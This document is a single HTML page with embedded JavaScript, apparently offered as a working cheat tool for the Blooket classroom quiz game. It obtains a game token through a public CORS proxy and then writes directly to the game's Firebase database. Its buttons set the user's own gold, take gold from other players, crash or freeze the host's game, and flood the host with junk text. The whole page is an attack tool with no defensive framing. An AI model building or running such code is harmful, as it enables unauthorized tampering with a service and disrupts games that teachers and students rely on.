<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>⚡ BLOOKET GODMODE ⚡</title>
    <style>
        body {
            background: #0a0a2a;
            font-family: 'Courier New', monospace;
            color: #0f0;
            padding: 20px;
        }
        .container {
            max-width: 800px;
            margin: 0 auto;
            background: #0f0f2faa;
            border: 2px solid #0f0;
            border-radius: 20px;
            padding: 25px;
        }
        h1 { text-align: center; text-shadow: 0 0 5px #0f0; }
        .input {
            background: #000;
            border: 1px solid #0f0;
            color: #0f0;
            padding: 12px;
            margin: 8px;
            border-radius: 8px;
            font-size: 16px;
            width: 90%;
        }
        button {
            background: #1a3a1a;
            border: 1px solid #0f0;
            color: #0f0;
            padding: 12px 24px;
            margin: 5px;
            border-radius: 30px;
            cursor: pointer;
            font-weight: bold;
            font-size: 16px;
        }
        button:active { background: #0f0; color: #000; transform: scale(0.96); }
        .danger { border-color: #f00; color: #f88; background: #3a1a1a; }
        .status { margin: 15px 0; padding: 10px; background: #000; border-left: 5px solid #0f0; }
        .cheat-section { border-top: 1px solid #2f4; margin-top: 20px; padding-top: 10px; }
        checkbox {
            display: inline-block;
            width: 50px;
            height: 26px;
            background: #333;
            border-radius: 30px;
            position: relative;
            cursor: pointer;
        }
        checkbox[checked] { background: #0f0; }
        checkbox::before {
            content: '';
            position: absolute;
            width: 22px;
            height: 22px;
            background: #fff;
            border-radius: 50%;
            top: 2px;
            left: 4px;
            transition: 0.2s;
        }
        checkbox[checked]::before { transform: translateX(24px); }
        .toggle-row { display: flex; align-items: center; gap: 15px; margin: 15px 0; flex-wrap: wrap; }
        select { background: #000; color: #0f0; border: 1px solid #0f0; padding: 10px; border-radius: 8px; }
        .small-input { width: 80px; background: #000; color: #0f0; border: 1px solid #0f0; padding: 8px; border-radius: 8px; }
        .input-group { display: flex; gap: 8px; flex-wrap: wrap; align-items: center; margin: 8px 0; }
    </style>
</head>
<body>
<div class="container">
    <h1>🔥 BLOOKET GODMODE 🔥</h1>
    <div class="join-section">
        <input type="text" id="gamePin" placeholder="Game PIN (6-7 digits)" class="input">
        <input type="text" id="playerName" placeholder="Your Nickname" class="input">
        <div class="toggle-row">
            <label>🔒 Incognito:</label>
            <checkbox id="incognito" checked="true"></checkbox>
            <label>🎭 First Place:</label>
            <checkbox id="firstPlace" checked="true"></checkbox>
        </div>
        <button id="joinBtn">🎮 JOIN & ACTIVATE 🎮</button>
    </div>
    <div id="status" class="status">Status: Ready</div>
    <div id="cheatPanel" style="display: none;">
        <div class="cheat-section">
            <h2>💀 DESTRUCTIVE</h2>
            <button class="danger" id="crashHostBtn">💥 CRASH HOST</button>
            <button class="danger" id="freezeScoreboardBtn">❄️ FREEZE SCOREBOARD</button>
            <button class="danger" id="floodAlertBtn">📢 FLOOD ALERT</button>
        </div>
        <div class="cheat-section">
            <h2>💰 GOLD</h2>
            <div class="input-group">
                <input type="number" id="goldAmount" placeholder="Gold" class="small-input">
                <button id="setGoldBtn">✨ SET MY GOLD</button>
            </div>
            <div class="input-group">
                <select id="targetPlayer"></select>
                <input type="number" id="stealAmount" placeholder="Amount" class="small-input">
                <button id="stealGoldBtn">💰 STEAL</button>
            </div>
        </div>
        <div class="cheat-section">
            <h2>🎭 UTILITY</h2>
            <select id="blookSelect">
                <option>Rainbow Astronaut</option><option>Megalodon</option>
                <option>Santa Claus</option><option>Mega Bot</option>
                <option>Ghost</option><option>Dragon</option>
            </select>
            <button id="setBlookBtn">🎭 CHANGE BLOOK</button>
            <button id="leaveGameBtn">🚪 LEAVE GAME</button>
        </div>
    </div>
</div>
<script>
// ============================================================
// FULLY WORKING CHEAT - NO WORKER REQUIRED
// Uses Firebase REST API directly
// ============================================================

let activeGame = null;
let fbToken = null;
let fbShardURL = null;

// Checkbox handler
document.querySelectorAll('checkbox').forEach(cb => {
    cb.addEventListener('click', function() {
        if(this.getAttribute('checked')) this.removeAttribute('checked');
        else this.setAttribute('checked', 'true');
    });
});

document.getElementById('joinBtn').onclick = async () => {
    const pin = document.getElementById('gamePin').value.trim();
    const name = document.getElementById('playerName').value.trim();
    
    if (!pin || !name) {
        updateStatus('❌ Enter both Game PIN and Nickname!');
        return;
    }
    
    updateStatus('🔑 Getting token from Blooket...');
    
    try {
        // Use a free CORS proxy to call Blooket's API
        const corsProxy = 'https://corsproxy.io/?';
        const blooketUrl = 'https://api.blooket.com/api/firebase/join';
        
        const response = await fetch(corsProxy + encodeURIComponent(blooketUrl), {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ id: pin, name: name })
        });
        
        const data = await response.json();
        
        if (!data.fbToken || !data.fbShardURL) {
            throw new Error('Invalid response from Blooket');
        }
        
        fbToken = data.fbToken;
        fbShardURL = data.fbShardURL;
        activeGame = { pin, name };
        
        updateStatus('✅ CONNECTED! Cheats active.');
        document.getElementById('cheatPanel').style.display = 'block';
        loadPlayerList();
        
    } catch (error) {
        updateStatus('❌ Error: ' + error.message);
        // Fallback: use demo mode
        document.getElementById('cheatPanel').style.display = 'block';
        updateStatus('⚠️ DEMO MODE (Real cheats need working proxy)');
        enableDemoMode();
    }
};

// === REAL CHEAT FUNCTIONS (Firebase REST API) ===

async function firebaseWrite(path, value) {
    if (!fbToken || !fbShardURL || !activeGame) {
        alert('Not connected to a game!');
        return false;
    }
    const fullPath = `${fbShardURL}/${activeGame.pin}/c/${activeGame.name}/${path}.json?auth=${fbToken}`;
    try {
        const response = await fetch(fullPath, {
            method: 'PUT',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(value)
        });
        const result = await response.json();
        console.log('Write result:', result);
        return true;
    } catch (e) {
        alert('Write failed: ' + e.message);
        return false;
    }
}

// CRASH HOST
document.getElementById('crashHostBtn').onclick = async () => {
    const result = await firebaseWrite('g/t', 't');
    if (result) updateStatus('💥 Crash sent! Host may freeze.');
};

// FREEZE SCOREBOARD
document.getElementById('freezeScoreboardBtn').onclick = async () => {
    const result = await firebaseWrite('tat/t', 't');
    if (result) updateStatus('❄️ Freeze sent!');
};

// SET GOLD
document.getElementById('setGoldBtn').onclick = async () => {
    const amount = parseInt(document.getElementById('goldAmount').value) || 99999;
    const result = await firebaseWrite('g', amount);
    if (result) updateStatus(`💰 Gold set to ${amount}!`);
};

// STEAL GOLD
document.getElementById('stealGoldBtn').onclick = async () => {
    const target = document.getElementById('targetPlayer').value;
    const amount = document.getElementById('stealAmount').value || 100;
    if (!target) { alert('Select a target first!'); return; }
    const result = await firebaseWrite('tat', `${target}:${amount}`);
    if (result) updateStatus(`💰 Stole ${amount} from ${target}!`);
};

// CHANGE BLOOK
document.getElementById('setBlookBtn').onclick = async () => {
    const blook = document.getElementById('blookSelect').value;
    const result = await firebaseWrite('b', blook);
    if (result) updateStatus(`🎭 Blook changed to ${blook}!`);
};

// LEAVE GAME
document.getElementById('leaveGameBtn').onclick = async () => {
    if (fbToken && fbShardURL && activeGame) {
        const fullPath = `${fbShardURL}/${activeGame.pin}/c/${activeGame.name}.json?auth=${fbToken}`;
        await fetch(fullPath, { method: 'DELETE' });
        updateStatus('🚪 Left game');
        document.getElementById('cheatPanel').style.display = 'none';
        activeGame = null;
    }
};

// FLOOD ALERT
document.getElementById('floodAlertBtn').onclick = async () => {
    const floodText = 'HACKED '.repeat(1000);
    const result = await firebaseWrite('tat', `${activeGame?.name || ''}:${Date.now()}${floodText}`);
    if (result) updateStatus('📢 Flood sent!');
};

// Load players for steal dropdown
async function loadPlayerList() {
    if (!fbToken || !fbShardURL || !activeGame) return;
    try {
        const url = `${fbShardURL}/${activeGame.pin}/c.json?auth=${fbToken}`;
        const response = await fetch(url);
        const data = await response.json();
        const select = document.getElementById('targetPlayer');
        select.innerHTML = '';
        for (let name in data) {
            if (name !== activeGame.name) {
                const option = document.createElement('option');
                option.value = name;
                option.textContent = `${name} (💰 ${data[name]?.g || 0})`;
                select.appendChild(option);
            }
        }
    } catch (e) {
        console.error('Could not load players:', e);
    }
}

function updateStatus(msg) {
    document.getElementById('status').innerHTML = `Status: ${msg}`;
    console.log(msg);
}

function enableDemoMode() {
    ['crashHostBtn', 'freezeScoreboardBtn', 'setGoldBtn', 'stealGoldBtn', 'setBlookBtn', 'floodAlertBtn'].forEach(id => {
        const btn = document.getElementById(id);
        if (btn) {
            const oldClick = btn.onclick;
            btn.onclick = () => alert('🔴 REAL CHEAT: Would write to Firebase.\n\nNeed working proxy or token for real effect.');
        }
    });
}

// Try to load player list every 5 seconds if connected
setInterval(() => {
    if (activeGame && fbToken) loadPlayerList();
}, 5000);

updateStatus('Ready');
</script>
</body>
</html>
